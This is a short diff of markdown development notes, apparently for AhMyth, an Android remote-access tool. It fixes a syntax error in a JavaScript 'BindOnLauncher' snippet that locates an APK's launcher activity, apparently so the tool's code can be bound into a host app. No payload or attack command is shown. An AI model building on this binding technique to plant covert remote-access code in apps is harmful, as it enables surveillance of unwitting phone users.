@@ -12,7 +12,6 @@ try {
 } catch (error) {
     // Building function here
 }
-
 ```
 
 # New Cross platform Bind on Launch function
@@ -22,7 +21,7 @@ This one was a bit of a pain to manage, but it was done in the end, this future 
 This new function also fixes a bug that was recently discovered when running AhMyth on Windows machines.
 
 ```js  
-    $appCtrl.BindOnLauncher = apkFolder) => {
+    $appCtrl.BindOnLauncher = (apkFolder) => {
 
 
     $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
